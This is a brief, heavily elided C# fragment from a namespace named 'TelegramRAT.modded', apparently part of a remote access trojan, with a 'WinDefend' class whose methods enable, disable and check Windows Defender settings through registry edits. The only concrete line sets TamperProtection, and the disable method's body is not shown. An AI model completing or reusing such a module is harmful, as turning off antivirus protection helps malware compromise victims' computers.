...
namespace TelegramRAT.modded
{
    internal class WinDefend
    {
        ...
        public static void Enable()
        {
            ...
            EnableDefenderFeatures();

            CheckDefenderSettings();
        }

        private static void EnableDefenderFeatures()
        {
            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "1");
        ...
        private static void DisableDefenderFeatures()
        {
        ...
        private static void CheckDefenderSettings()
        {
